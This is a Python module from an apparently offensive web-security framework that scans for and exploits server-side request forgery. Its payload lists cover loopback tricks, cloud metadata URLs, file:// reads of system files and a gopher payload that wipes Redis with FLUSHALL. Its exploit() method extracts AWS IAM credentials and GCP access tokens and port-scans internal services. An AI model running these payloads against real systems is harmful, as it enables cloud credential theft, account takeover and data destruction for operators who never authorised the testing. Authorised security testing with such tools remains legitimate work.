import re
import json
from modules.base import BaseModule
from core.utils import extract_params
from core.http import inject_param

class SsrfModule(BaseModule):
    name = "ssrf"
    description = "Server-Side Request Forgery Scanner"
    exploitable = True
    
    ssrf_indicators = [
        r"root:.*:0:0:",
        r"\[boot loader\]",
        r"\[extensions\]",
        r"ami-id",
        r"instance-id",
        r"hostname",
        r"local-hostname",
        r"iam/security-credentials",
        r"compute/metadata",
        r"AccessKeyId",
        r"SecretAccessKey",
        r"Connection refused",
        r"Connection timed out",
        r"No route to host",
        r"Empty reply from server",
    ]
    
    cloud_signatures = {
        "AWS": [r"ami-", r"instance-id", r"AccessKeyId", r"SecretAccessKey", r"iam/"],
        "GCP": [r"computeMetadata", r"google", r"instance/zone"],
        "Azure": [r"azurefd", r"azure", r"microsoft"],
        "DigitalOcean": [r"droplet", r"digitalocean"],
    }
    
    async def scan(self, target):
        self.findings = []
        params = extract_params(target)
        
        url_params = self._find_url_params(params)
        
        if url_params:
            await self._test_internal_access(target, url_params)
            await self._test_cloud_metadata(target, url_params)
            await self._test_protocol_smuggling(target, url_params)
        
        return self.findings
    
    def _find_url_params(self, params):
        url_keywords = ["url", "uri", "path", "dest", "redirect", "next", "target",
                       "rurl", "return", "link", "src", "source", "ref", "site",
                       "host", "domain", "callback", "feed", "to", "out", "view",
                       "dir", "page", "file", "document", "folder", "root", "img",
                       "image", "load", "open", "data", "content", "reference"]
        
        found = []
        for param in params:
            if any(kw in param.lower() for kw in url_keywords):
                found.append(param)
        
        return found if found else params
    
    async def _test_internal_access(self, target, params):
        internal_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:22",
            "http://127.0.0.1:443",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://0x7f000001",
            "http://2130706433",
            "http://017700000001",
            "http://0177.0.0.1",
        ]
        
        for param in params:
            for payload in internal_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    for indicator in self.ssrf_indicators:
                        if re.search(indicator, resp["text"], re.IGNORECASE):
                            self.record_success(payload, target)
                            self.add_finding(
                                "CRITICAL",
                                f"SSRF: Internal network access",
                                url=target,
                                parameter=param,
                                evidence=f"Payload: {payload}"
                            )
                            return
    
    async def _test_cloud_metadata(self, target, params):
        metadata_payloads = [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS"),
            ("http://169.254.169.254/latest/user-data/", "AWS"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
            ("http://169.254.169.254/metadata/v1/", "DigitalOcean"),
        ]
        
        for param in params:
            for payload, cloud in metadata_payloads:
                headers = {"Metadata-Flavor": "Google"} if cloud == "GCP" else {}
                resp = await self.http.get(inject_param(target, param, payload), headers=headers)
                
                if resp.get("status") and resp["status"] == 200:
                    if cloud in self.cloud_signatures:
                        for pattern in self.cloud_signatures[cloud]:
                            if re.search(pattern, resp["text"], re.IGNORECASE):
                                self.add_finding(
                                    "CRITICAL",
                                    f"SSRF: {cloud} metadata access",
                                    url=target,
                                    parameter=param,
                                    evidence=f"Cloud provider: {cloud}"
                                )
                                return
    
    async def _test_protocol_smuggling(self, target, params):
        protocol_payloads = [
            ("file:///etc/passwd", "file"),
            ("file:///c:/windows/win.ini", "file"),
            ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "gopher"),
            ("dict://127.0.0.1:6379/info", "dict"),
            ("ftp://127.0.0.1", "ftp"),
        ]
        
        for param in params:
            for payload, protocol in protocol_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    if protocol == "file":
                        if "root:" in resp["text"] or "[extensions]" in resp["text"]:
                            self.add_finding(
                                "CRITICAL",
                                f"SSRF: File protocol access",
                                url=target,
                                parameter=param,
                                evidence=f"Protocol: {protocol}"
                            )
                            return
    
    async def exploit(self, target, finding):
        param = finding.get("parameter")
        if not param:
            return None
        
        extracted = {"cloud": None, "credentials": None, "metadata": {}, "internal_services": []}
        
        aws_endpoints = [
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/hostname",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/ami-id",
            "/latest/meta-data/instance-id",
            "/latest/meta-data/instance-type",
            "/latest/user-data/",
            "/latest/dynamic/instance-identity/document",
        ]
        
        for endpoint in aws_endpoints:
            url = f"http://169.254.169.254{endpoint}"
            resp = await self.http.get(inject_param(target, param, url))
            if resp.get("status") == 200 and resp.get("text"):
                text = resp["text"]
                extracted["cloud"] = "AWS"
                extracted["metadata"][endpoint] = text[:500]
                
                if "iam/security-credentials/" in endpoint and text.strip():
                    role_name = text.strip().split("\n")[0]
                    creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                    creds_resp = await self.http.get(inject_param(target, param, creds_url))
                    if creds_resp.get("status") == 200:
                        try:
                            creds = json.loads(creds_resp["text"])
                            extracted["credentials"] = {
                                "AccessKeyId": creds.get("AccessKeyId"),
                                "SecretAccessKey": creds.get("SecretAccessKey"),
                                "Token": creds.get("Token", "")[:50] + "..." if creds.get("Token") else None,
                                "Expiration": creds.get("Expiration"),
                                "Role": role_name
                            }
                            self.add_finding(
                                "CRITICAL",
                                "SSRF EXPLOITED: AWS Credentials Extracted!",
                                url=target,
                                parameter=param,
                                evidence=f"AccessKeyId: {creds.get('AccessKeyId')}, Role: {role_name}"
                            )
                        except json.JSONDecodeError:
                            pass
        
        gcp_endpoints = [
            "/computeMetadata/v1/instance/hostname",
            "/computeMetadata/v1/instance/zone",
            "/computeMetadata/v1/project/project-id",
            "/computeMetadata/v1/instance/service-accounts/default/token",
            "/computeMetadata/v1/instance/service-accounts/default/email",
        ]
        
        for endpoint in gcp_endpoints:
            url = f"http://metadata.google.internal{endpoint}"
            resp = await self.http.get(inject_param(target, param, url), headers={"Metadata-Flavor": "Google"})
            if resp.get("status") == 200 and resp.get("text"):
                extracted["cloud"] = "GCP"
                extracted["metadata"][endpoint] = resp["text"][:500]
                
                if "token" in endpoint:
                    try:
                        token_data = json.loads(resp["text"])
                        extracted["credentials"] = {
                            "access_token": token_data.get("access_token", "")[:50] + "...",
                            "token_type": token_data.get("token_type"),
                            "expires_in": token_data.get("expires_in")
                        }
                        self.add_finding(
                            "CRITICAL",
                            "SSRF EXPLOITED: GCP Access Token Extracted!",
                            url=target,
                            parameter=param,
                            evidence=f"Token type: {token_data.get('token_type')}"
                        )
                    except json.JSONDecodeError:
                        pass
        
        internal_ports = [22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443, 9200, 11211]
        for port in internal_ports:
            url = f"http://127.0.0.1:{port}/"
            resp = await self.http.get(inject_param(target, param, url))
            if resp.get("status") and resp["status"] != 502:
                service = self._identify_service(port, resp.get("text", ""))
                extracted["internal_services"].append({
                    "port": port,
                    "service": service,
                    "status": resp["status"],
                    "banner": resp.get("text", "")[:200]
                })
        
        if extracted["credentials"] or extracted["metadata"] or extracted["internal_services"]:
            self.exploited_data = extracted
            return extracted
        
        return None
    
    def _identify_service(self, port, response):
        services = {
            22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL",
            5432: "PostgreSQL", 6379: "Redis", 27017: "MongoDB",
            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9200: "Elasticsearch", 11211: "Memcached"
        }
        return services.get(port, "Unknown")